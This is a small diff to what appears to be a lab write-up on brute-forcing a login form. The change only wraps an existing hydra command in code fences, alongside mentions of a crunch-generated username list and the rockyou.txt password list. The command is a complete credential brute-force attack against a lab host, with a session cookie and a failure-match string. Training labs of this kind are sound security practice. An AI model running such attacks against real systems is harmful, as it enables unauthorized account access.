@@ -21,4 +21,6 @@ crunch 5 8 abcdefghijklmn -o usernames.txt
 ```
 For password, we will use rockyou.txt as list
 
+```
 hydra -f -S 4280-port-c9ca66e998614364.labs.kodekloud.com http-form-get "/vulnerabilities/brute:username=^USER^&password=^PASS^&Login=submit:F=Username and/or password incorrect.:H=Cookie:security=low; PHPSESSID=752d8f869d751bceb05b112632080b5b" -l admin -P rockyou.txt
+```
